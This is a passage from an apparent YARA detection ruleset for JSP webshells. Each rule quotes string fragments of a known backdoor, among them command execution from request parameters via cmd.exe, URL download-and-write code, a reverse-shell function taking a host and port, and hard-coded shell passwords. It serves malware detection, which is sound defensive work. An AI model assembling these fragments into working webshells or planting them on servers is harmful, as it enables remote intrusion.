        $s6 = "String tempLine = rd.readLine();" fullword ascii
        $s7 = "for (int i = SysInfo.length() - 1; i >= 0; i--) {" fullword ascii
        $s8 = "tempLine = rd.readLine();" fullword ascii
        $s9 = "tempStr.append(tempLine);" fullword ascii
        $s10 = "StringBuffer tempStr = new StringBuffer();" fullword ascii
        $s11 = "url_con = (HttpURLConnection) url.openConnection();" fullword ascii
        $s12 = "String c=\"\\n\\r\"; long d=127,  f=11, j=12, h=14,  m=31, r=83, k=1, n=8,  s=114, u=-5, v=5,a=0;" fullword ascii
        $s13 = "BufferedReader rd = new BufferedReader(new InputStreamReader(in," fullword ascii
        $s14 = "InputStream in = url_con.getInputStream();" fullword ascii
        $s15 = "String crlf=System.getProperty(\"line.separator\");" fullword ascii
        $s16 = "while (tempLine != null)" fullword ascii
        $s17 = "HttpURLConnection url_con = null;" fullword ascii
        $s18 = "private static int readTimeOut = 10000;" fullword ascii
        $s19 = "url_con.getOutputStream().close();" fullword ascii
        $s20 = "url_con.getOutputStream().flush();" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_30cf4dccf67c46a6f100818d4d4141c0150b1281
{
    meta:
        description = "jsp - file 30cf4dccf67c46a6f100818d4d4141c0150b1281.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "089c2df0356824595c6a14851a1f28bae4482a0cb9bc5864404c986749e64040"
    strings:
        $x1 = "ResultSet r = m.executeQuery(q.indexOf(\"--f:\") != -1 ? q.substring(" fullword ascii
        $s2 = "ResultSet r = m.executeQuery(\"select * from \" + x[x.length - 1]);" fullword ascii
        $s3 = "z2 = EC(getFromBase64(toStringHex(request.getParameter(\"password\"))) + \"\");" fullword ascii
        $s4 = "System.out.println(\"ERROR\" + \":// \" + e.toString());" fullword ascii
        $s5 = "return DriverManager.getConnection(x[1].trim() + \":\" + x[4]," fullword ascii
        $s6 = "String[] aa = getFromBase64(toStringHex(request.getParameter(\"username\")))" fullword ascii
        $s7 = "Connection c = DriverManager.getConnection(x[1].trim()," fullword ascii
        $s8 = "os.write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d.charAt(i + 1))));" fullword ascii
        $s9 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()" fullword ascii
        $s10 = "ResultSet r = s.indexOf(\"jdbc:oracle\") != -1 ? c.getMetaData()" fullword ascii
        $s11 = "sF += l[i].getName() + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\"" fullword ascii
        $s12 = "sb.append(d.getColumnName(i) + \" (\" + d.getColumnTypeName(i)" fullword ascii
        $s13 = "import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*,sun.misc.*\"%>" fullword ascii
        $s14 = "z2.indexOf(\"-to:\") + 4, z2.length()) : s" fullword ascii
        $s15 = "z2.indexOf(\"-to:\") != -1 ? z2.substring(" fullword ascii
        $s16 = "q.indexOf(\"-to:\") != -1 ? p.trim() : p" fullword ascii
        $s17 = "if (q.indexOf(\"-to:\") == -1) {" fullword ascii
        $s18 = "sb.append(r.getObject(i) + \"\" + \"\\t|\\t\");" fullword ascii
        $s19 = "+ q.substring(q.indexOf(\"--f:\") + 4," fullword ascii
        $s20 = "bw.write(r.getObject(i) + \"\" + \"\\t\");" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 30KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_19e30ccd0c4695c76a8d02259a446f109df6ba24
{
    meta:
        description = "jsp - file 19e30ccd0c4695c76a8d02259a446f109df6ba24.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4b4fe0aa707377467c8902275cc8b0bca9a1bb82c2ee143f2a66740c6ee7b1a9"
    strings:
        $x1 = "</font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>\"};" fullword ascii
        $x2 = "????<a href=\"http://bbs.syue.com/\" target=\"_blank\">http://bbs.syue.com/</a></b>" fullword ascii
        $s3 = "<center><a href=\"http://www.wooyun.org/\" target=\"_blank\">http://www.WooYun.org/</a> ,All Rights Reserved." fullword ascii
        $s4 = "out.println(\"<table border='1' width='100%' bgcolor='#FBFFC6' cellspacing=0 cellpadding=5 bordercolorlight=#000000 bordercolord" ascii
        $s5 = "<br>Email:121208099#qq.com" fullword ascii
        $s6 = "String[] strExecute      = {\"????\",\"Execute\"};" fullword ascii
        $s7 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
        $s8 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
        $s9 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('del','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','" ascii
        $s10 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'," ascii
        $s11 = "sbFile.append(\"\"+list[i].getName()); " fullword ascii
        $s12 = "rk=#FFFFFF><tr><td width='30%'>\"+strCurrentFolder[languageNo]+\"?? <b>\"+strDir+\"</b></td><td>\" + getDrivers() + \"</td></tr>" ascii
        $s13 = "String[] strSysProperty  = {\"?? ?? ?? ??\",\"System Property\"};" fullword ascii
        $s14 = "??\",\"Command Window\"};" fullword ascii
        $s15 = "sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsolutePat" ascii
        $s16 = "response.setContentType(\"APPLICATION/OCTET-STREAM\"); " fullword ascii
        $s17 = "<title>JSP Shell " fullword ascii
        $s18 = "sbCmd.append(line+\"\\r\\n\");  " fullword ascii
        $s19 = "String[] strFileOperation= {\"??????" fullword ascii
        $s20 = "???????????????????? ?? cmd????</p>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 90KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_5245173e6adf00979006ddc15710ed14366eec86
{
    meta:
        description = "jsp - file 5245173e6adf00979006ddc15710ed14366eec86.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9347f147b944e67d33818aa1a5fa10476ef333acb838e80fffb2db2da71c9368"
    strings:
        $x1 = "out.println(\"<html><head><title>JspSpy Private Codz By - Yu-brother</title><style type=\\\"text/css\\\">\"+" fullword ascii
        $x2 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009 Private </a></s" ascii
        $s3 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009 Private </a></s" ascii
        $s4 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2009 Yu-brother </span><a href=\\\"http://www.forjj.com\\\" target" ascii
        $s5 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2009 Yu-brother </span><a href=\\\"http://www.forjj.com\\\" target" ascii
        $s6 = "private static final String PW = \"test\"; //password" fullword ascii
        $s7 = "\\\">www.Forjj.com</a>--></p>\"+" fullword ascii
        $s8 = "t.getHeader(\"host\")+\" (<span id='ip'>\"+InetAddress.getLocalHost().getHostAddress()+\"</span>) | <a href=\\\"javascript:if (!" ascii
        $s9 = "\"    <hr/>Export \\\"<span style='color:red;font-weight:bold'>\"+(Util.isEmpty(sql) ? table : sql.replaceAll(\"\\\"\",\"&quot;" ascii
        $s10 = "\"    </form><span style='font-weight:bold;color:red;font-size:12px'>by:Yu-brother</span></body></html>\");" fullword ascii
        $s11 = "clipboardData){alert('only support IE!');}else{void(window.clipboardData.setData('Text', document.getElementById('ip').innerText" ascii
        $s12 = "byte[] b = colName.getBytes();" fullword ascii
        $s13 = "byte[] b = v.getBytes();" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_36e91678f1e2887b5524cc7fdc8e6790aa4a378a
{
    meta:
        description = "jsp - file 36e91678f1e2887b5524cc7fdc8e6790aa4a378a.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3b4283db4961a557b02b3de8377b61f5c085552a46191625db42939056129d53"
    strings:
        $s1 = "System.setProperty(\"sun.net.client.defaultConnectTimeout\", String" fullword ascii
        $s2 = "System.setProperty(\"sun.net.client.defaultReadTimeout\", String" fullword ascii
        $s3 = "private static final String PW = \"xfg\"; //password" fullword ascii
        $s4 = "responseContent = tempStr.toString();" fullword ascii
        $s5 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword ascii
        $s6 = "String tempLine = rd.readLine();" fullword ascii
        $s7 = "for (int i = SysInfo.length() - 1; i >= 0; i--) {" fullword ascii
        $s8 = "tempLine = rd.readLine();" fullword ascii
        $s9 = "tempStr.append(tempLine);" fullword ascii
        $s10 = "StringBuffer tempStr = new StringBuffer();" fullword ascii
        $s11 = "url_con = (HttpURLConnection) url.openConnection();" fullword ascii
        $s12 = "String c=\"\\n\\r\"; long d=127,  f=11, j=12, h=14,  m=31, r=83, k=1, n=8,  s=114, u=-5, v=5,a=0;" fullword ascii
        $s13 = "BufferedReader rd = new BufferedReader(new InputStreamReader(in," fullword ascii
        $s14 = "InputStream in = url_con.getInputStream();" fullword ascii
        $s15 = "String crlf=System.getProperty(\"line.separator\");" fullword ascii
        $s16 = "while (tempLine != null)" fullword ascii
        $s17 = "HttpURLConnection url_con = null;" fullword ascii
        $s18 = "private static int readTimeOut = 10000;" fullword ascii
        $s19 = "url_con.getOutputStream().close();" fullword ascii
        $s20 = "url_con.getOutputStream().flush();" fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule f35597280545d99a482b0f6e577327dfa3cebe43
{
    meta:
        description = "jsp - file f35597280545d99a482b0f6e577327dfa3cebe43.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "517a84234f57474bc309fc4d0045f6784a40ee26c1d4abb9cfd42518d9b6de5c"
    strings:
        $x1 = "Process child = Runtime.getRuntime().exec(cmd);" fullword ascii
        $s2 = "System.err.println(e);" fullword ascii
        $s3 = "InputStream in = child.getInputStream();" fullword ascii
        $s4 = "while ((c = in.read()) != -1) {" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule ccf6242dcc8dcbfde4fd317aeb99d9a627b972b9
{
    meta:
        description = "jsp - file ccf6242dcc8dcbfde4fd317aeb99d9a627b972b9.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b8955bc502fccaab2ef4719653480facb9576bc57632e248eaaa3f519f972ca2"
    strings:
        $s1 = "out.println(\"<a href='\"+request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+request.getReq" fullword ascii
        $s2 = "String context=new String(request.getParameter(\"context\").getBytes(\"ISO-8859-1\"),\"gb2312\");    " fullword ascii
        $s3 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\"),\"gb2312\");    " fullword ascii
        $s4 = "out.println(\"<a href='\"+request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+request.getRequestUR" ascii
        $s5 = "<form name=\"frmUpload\" method=\"post\" action=\"\">    " fullword ascii
        $s6 = "????:</font><%out.print(request.getRealPath(request.getServletPath())); %>    " fullword ascii
        $s7 = "??????????????????:<textarea name=\"context\" id=\"context\" style=\"width: 51%; height: 150px;\"></textarea>    " fullword ascii
        $s8 = "<%@page import=\"java.io.*,java.util.*,java.net.*\"%>    " fullword ascii
        $s9 = "out.println(\"<font color='red'>???????" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 6KB and ( all of them ) ) or ( all of them )
}

rule d68c520c23e129a03bbb1ca3c2a305fc6cad26a3
{
    meta:
        description = "jsp - file d68c520c23e129a03bbb1ca3c2a305fc6cad26a3.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e0539a2d4e132884adc135c8438f7647ddd6be61f1f9d83966b12f17382a1296"
    strings:
        $x1 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParameter(\"cmd\"));" fullword ascii
        $s2 = "// cmd.jsp = Command Execution (win32)" fullword ascii
        $s3 = "out.println(\"Command: \" + request.getParameter(\"cmd\") + \"\\n<BR>\");" fullword ascii
        $s4 = "if (request.getParameter(\"cmd\") != null) {" fullword ascii
        $s5 = "<%@ page import=\"java.util.*,java.io.*,java.net.*\"%>" fullword ascii
        $s6 = "out.println(disr); disr = dis.readLine(); }" fullword ascii
        $s7 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword ascii
        $s8 = "InputStream in = p.getInputStream();" fullword ascii
        $s9 = "OutputStream os = p.getOutputStream();" fullword ascii
        $s10 = "<INPUT TYPE=\"text\" NAME=\"cmd\">" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 2KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_4c356d66708eda6004b08a99e97db7b239eafce7
{
    meta:
        description = "jsp - file 4c356d66708eda6004b08a99e97db7b239eafce7.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0e7176e1e40aa5f059ba14236f42d79af672ab1a097aa8a3a07092b055fb5571"
    strings:
        $x1 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(cwd));" fullword ascii
        $s2 = "target.style.background = '\" + shell_color + \"';\" +" fullword ascii
        $s3 = "response.setHeader(\"Content-Disposition\",\"attachment; filename=\\\"\" + myfile__.getName() + \"\\\"\");" fullword ascii
        $s4 = "Process p = Runtime.getRuntime().exec(finals);" fullword ascii
        $s5 = "\"<input style=\\\"width:300px;\\\" type=\\\"text\\\" name=\\\"childname\\\" value=\\\"\" + shell_name + \".jsp\\\"; />\" +" fullword ascii
        $s6 = "Hashtable ht = myParser.processData(request.getInputStream(), bound, xCwd, clength);" fullword ascii
        $s7 = "String shell_password = \"devilzc0der\";" fullword ascii
        $s8 = "\"<div style=\\\"font-size:10px;\\\">\" + shell_fake_name + \"</div>\" +" fullword ascii
        $s9 = "html_head = \"<title>\" + html_title + \"</title>\" + shell_style;" fullword ascii
        $s10 = "String shell_fake_name = \"Server Logging System\";" fullword ascii
        $s11 = "\"<link rel=\\\"SHORTCUT ICON\\\" href=\\\"\" + script_name + \"?img=icon\\\" />\" + shell_style +" fullword ascii
        $s12 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string '           ' */ /* reversed goodware string 'BAAAAAAAAAAAAAA' */
        $s13 = "if((request.getParameter(\"cmd\")!=null) || (request.getParameter(\"passw\")!=null)){" fullword ascii
        $s14 = "String tmpdir = xcleanpath(System.getProperty(\"java.io.tmpdir\"));" fullword ascii
        $s15 = "var pola = 'example: (using netcat) run &quot;nc -l -p __PORT__&quot; and then press Connect';" fullword ascii
        $s16 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
        $s17 = "color:\" + shell_color + \";\" +" fullword ascii
        $s18 = "background:\" + shell_color + \";\" +" fullword ascii
        $s19 = "if(xrunexploit(xCwd,base64,port,request.getRemoteAddr())){" fullword ascii
        $s20 = "if((request.getParameter(\"cmd\")!=null) && (!request.getParameter(\"cmd\").equals(\"\"))){" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_22609061c167befd5c32b0798eb52e89d68c74ef
{
    meta:
        description = "jsp - file 22609061c167befd5c32b0798eb52e89d68c74ef.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "836ded8dfc718ed565044716d1552e0a8ac19454731cff605257aeca82243c0e"
    strings:
        $s1 = "java.io.InputStream in = new java.net.URL(request.getParameter(\"u\")).openStream();" fullword ascii
        $s2 = "new java.io.FileOutputStream(request.getParameter(\"f\")).write(baos.toByteArray());" fullword ascii
        $s3 = "while ((a = in.read(b)) != -1) {" fullword ascii
        $s4 = "java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_74cc6ab5a85b1ce4fb8c082690833a87209ed9ed
{
    meta:
        description = "jsp - file 74cc6ab5a85b1ce4fb8c082690833a87209ed9ed.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5b3c6b4d7423cefb536cb3361d6f77686baebe90e43278e0f2145fb5e0bbd642"
    strings:
        $s1 = "java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream();" fullword ascii
        $s2 = "if(\"023\".equals(request.getParameter(\"pwd\"))){" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule d8240b86440106b5a54200760c0f914bd8117658
{
    meta:
        description = "jsp - file d8240b86440106b5a54200760c0f914bd8117658.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "87c3ac9b75a72187e8bc6c61f50659435dbdc4fde6ed720cebb93881ba5989d8"
    strings:
        $s1 = ").exec(type+request.getParameter(\"c\"));" fullword ascii
        $s2 = "String type = request.getParameter(\"w\")==null?\"\":\"cm\"+\"d.e\"+\"xe /c \";" fullword ascii
        $s3 = "out.println(\"mingling: \" + request.getParameter(\"c\") + \"\\n<BR>\");" fullword ascii
        $s4 = "Process p = Runtime.getRuntime(" fullword ascii
        $s5 = "java.io.DataInputStream dis = new java.io.DataInputStream(in);" fullword ascii
        $s6 = "<pre><%if (request.getParameter(\"c\") != null) {" fullword ascii
        $s7 = "java.io.InputStream in = p.getInputStream();" fullword ascii
        $s8 = "java.io.OutputStream os = p.getOutputStream();" fullword ascii
        $s9 = "while (disr != null) {out.println(disr); disr=dis.readLine();}}" fullword ascii
    condition:
        ( uint16(0) == 0x703c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_155c441e853b1c7e3e12b32f39fc30a5d577f818
{
    meta:
        description = "jsp - file 155c441e853b1c7e3e12b32f39fc30a5d577f818.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "958a64e5114aa031ec3043d95f1be2716085c41d27a28d1888855b11ecb0641b"
    strings:
        $x1 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword ascii
        $s2 = "BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));" fullword ascii
        $s3 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword ascii
        $s4 = "<INPUT name='cmd' type=text>" fullword ascii
        $s5 = "if(cmd != null) {" fullword ascii
        $s6 = "while((s = sI.readLine()) != null) {" fullword ascii
    condition:
        ( uint16(0) == 0x463c and filesize < 1KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_954f2e099e6c7dec5d14957372c2950cc00b3580
{
    meta:
        description = "jsp - file 954f2e099e6c7dec5d14957372c2950cc00b3580.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "bd9f607eb2612a20b7b2ae9bb0f6412abaa0580694fb9020955e97d76bb08fdf"
    strings:
        $s1 = "th(\"/\")+request.getParameter(\"f\"));InputStream is=request.getInputStream();byte[] b=new byte[512];int n;while((n=is.read(b,0" ascii
        $s2 = "<%@page import=\"java.io.*\"%><%if(request.getParameter(\"f\")!=null){FileOutputStream os=new FileOutputStream(application.getRe" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_1a047f4bdf0334f58e23a77fb8190f74a864fffd
{
    meta:
        description = "jsp - file 1a047f4bdf0334f58e23a77fb8190f74a864fffd.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "dbaa31e2207418889299b04adf1e4b1aa2340b30d165f1afe2eb1f21557249df"
    strings:
        $s1 = "(request.getParameter(\"t\").getBytes());" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule aab2003aabc5893ecb63edef66297089c59d88fc
{
    meta:
        description = "jsp - file aab2003aabc5893ecb63edef66297089c59d88fc.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e2daa70b1cbb80911d9c2f48bb527ef64ef55995938cb12beb820e890dd30240"
    strings:
        $s1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009</a></span>\"+re" ascii
        $s2 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009</a></span>\"+re" ascii
        $s3 = "response.getWriter().println(\"<div style=\\\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#ee" ascii
        $s4 = "\"<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2012 Admin </span><a href=\\\"http://www.baidu.com\\\" target=\\\"_bla" ascii
        $s5 = "\"<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2012 Admin </span><a href=\\\"http://www.baidu.com\\\" target=\\\"_bla" ascii
        $s6 = "\">Copyright (C) 2009 <a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">http://www.baidu.com/</a>&nbsp;&nbsp;<a target=" ascii
        $s7 = "\" href=\\\"http://www.baidu.com/\\\">[T00ls.Net]</a> All Rights Reserved.\"+" fullword ascii
        $s8 = "new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),\"exeRclientO\",olp).start();//??????" fullword ascii
        $s9 = "private static final String PW = \"k8team\"; //password" fullword ascii
        $s10 = "idu.com</a></p>\"+" fullword ascii
        $s11 = ";\\\" /> <input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Scan\\\" id=\\\"submit\\\" class=\\\"bt\\\" />\"+" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule sig_6cf0f458ae8faaabc449509d69531450b2067f3b
{
    meta:
        description = "jsp - file 6cf0f458ae8faaabc449509d69531450b2067f3b.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "43155417ae71646a6caa1151c865fd26c2ac8f333aa155123310e252c23f8827"
    strings:
        $x1 = "out.print(\"<td colspan=2>filepath:<input name=execFile size=75 type=text title='d:\\\\cmd.exe /c dir c:'></td><td><input name=" fullword ascii
        $x2 = "out.print(\"<td colspan=2>filepath:<input name=execFile size=75 type=text title='d:\\\\cmd.exe /c dir c:'></td><td><input name=g" ascii
        $x3 = "out.print(\"<td>SqlCmd:<input type=text name=sqlcmd title='select * from admin'><input name=run type=submit value=Exec></td>\"" fullword ascii
        $x4 = "out.print(\"<td colspan=2>file:<input name=file type=file>upload file<input title='d:\\\\silic.txt' name=UPaddress size=35 type" fullword ascii
        $x5 = "out.println(\"<tr><td bgcolor=menu><a href='http://blackbap.org/' target=FileFrame>About Silic Group</a></td></tr>\");" fullword ascii
        $x6 = "out.println(\"<tr><td bgcolor=menu><a href=?Action=T target=FileFrame>\"+ico(53)+\"SystemTools</a></td></tr>\");" fullword ascii
        $s7 = "out.print(\"<tr><td><a href='?Action=HttpProxy' target=FileFrame>OpenTheHttpProxy</a></td></tr>\");" fullword ascii
        $s8 = "out.print(\"<tr><td><a href='?Action=HttpProxy' target=FileFrame>CloseTheHttpProxy</a></td></tr>\");" fullword ascii
        $s9 = "out.println(\"<tr><td bgcolor=menu><a href=?Action=S target=FileFrame>\"+ico(53)+\"SystemInfo(System.class)</a></td></tr>\");" fullword ascii
        $s10 = "out.println(\"<tr><td bgcolor=menu><a href=?Action=L target=FileFrame>\"+ico(53)+\"ServletInfo</a></td></tr>\");" fullword ascii
        $s11 = "out.println(\"<tr><td bgcolor=menu><a href=?Action=i target=FileFrame>\"+ico(57)+\"Interfaces</a></td></tr>\");" fullword ascii
        $s12 = "out.println(\"<tr bgcolor=menu><td><a href=\\\"javascript:top.address.FolderPath.value='\"+folderReplace(f[i].getAbs" fullword ascii
        $s13 = "out.print(Runtime.getRuntime().availableProcessors()+\" <br>\");" fullword ascii
        $s14 = "out.print(\"<tr><form method=post action='?Action=IPscan'><td bordercolorlight=Black bgcolor=menu>Scan Port</td><td>IP:<input" fullword ascii
        $s15 = "\"<form name=login method=post>username:<input name=Silic type=text size=15><br>\" +" fullword ascii
        $s16 = "out.print(\"<form name=address method=post target=FileFrame onSubmit='checkUrl();'>\");" fullword ascii
        $s17 = "con=DriverManager.getConnection(url,userName,passWord);" fullword ascii
        $s18 = "\"password:<input name=juliet type=password size=15><br><input type=submit value=Login></form></center>\");" fullword ascii
        $s19 = "out.print(\"Driver:<input name=driver type=text>URL:<input name=conUrl type=text>user:<input name=user type=text size=3>passw" fullword ascii
        $s20 = "out.print(\"<tr><form method=post action='?Action=APIreflect'><td bordercolorlight=Black bgcolor=menu>Reflect API</td><td col" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_3c546df74e37eff27ab1570241e24e1ace9e56e9
{
    meta:
        description = "jsp - file 3c546df74e37eff27ab1570241e24e1ace9e56e9.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "fcd593c52489526b4c83660cba0b22cccb833614ff451c37263d64c726766b77"
    strings:
        $x1 = "return new String(inutStreamToOutputStream(Runtime.getRuntime().exec(cmd).getInputStream()).toByteArray(),encoding);" fullword ascii
        $s2 = "out.write((\"User:\\t\"+exec(\"whoami\")).getBytes());" fullword ascii
        $s3 = "shell(request.getParameter(\"host\"), Integer.parseInt(request.getParameter(\"port\")));" fullword ascii
        $s4 = "out.println(\"<pre>\"+exec(request.getParameter(\"cmd\"))+\"</pre>\");" fullword ascii
        $s5 = "static void shell(String host,int port) throws UnknownHostException, IOException{" fullword ascii
        $s6 = "out.write(exec(new String(b,0,a,\"UTF-8\").trim()).getBytes(\"UTF-8\"));" fullword ascii
        $s7 = "encoding = isNotEmpty(getSystemEncoding())?getSystemEncoding():encoding;" fullword ascii
        $s8 = "response.setHeader(\"Content-Disposition\", \"attachment; filename=\"+fileName);" fullword ascii
        $s9 = "download(request.getParameter(\"url\"), request.getParameter(\"path\"));" fullword ascii
        $s10 = "saveFile(new String(file.getBytes(\"ISO-8859-1\"),\"utf-8\"),new String(data.getBytes(\"ISO-8859-1\"),\"utf-8\"));" fullword ascii
        $s11 = "out.println(\"<HR size=\\\"1\\\" noshade=\\\"noshade\\\"><h3>\"+application.getServerInfo()+\"</h3></body></html>\");" fullword ascii
        $s12 = "static String exec(String cmd) {" fullword ascii
        $s13 = "static String auto(String url,String fileName,String cmd) throws MalformedURLException, IOException{" fullword ascii
        $s14 = "return System.getProperty(\"sun.jnu.encoding\");" fullword ascii
        $s15 = "String fileName = file.isDirectory() ? file.getName()+\".zip\":file.getName();" fullword ascii
        $s16 = "out.println(\"<form action=\\\"\\\" method=\\\"post\\\" id=\\\"fm\\\">\");" fullword ascii
        $s17 = "copyInputStreamToFile(new URL(url).openConnection().getInputStream(), path);" fullword ascii
        $s18 = "static void download(String url,String path) throws MalformedURLException, IOException{" fullword ascii
        $s19 = "response.setContentType(\"application/x-download\");" fullword ascii
        $s20 = "* @throws UnknownHostException" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 30KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_1213db93b5e2fdc0a53d41674e7b1ea78876106c
{
    meta:
        description = "jsp - file 1213db93b5e2fdc0a53d41674e7b1ea78876106c.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "89a1dccb42fea5cb434392324f8729127399f344fba831e60f004a063b05c265"
    strings:
        $s1 = "new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),\"exeRclientO\",olp).start();//???????????" fullword ascii
        $s2 = "private static final String PW = \"admin\"; //password" fullword ascii
        $s3 = "x;\\\" /> <input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Scan\\\" id=\\\"submit\\\" class=\\\"bt\\\" />\"+" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule sig_85fb895d152dfd909895e08f4250d2c92e607dc7
{
    meta:
        description = "jsp - file 85fb895d152dfd909895e08f4250d2c92e607dc7.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
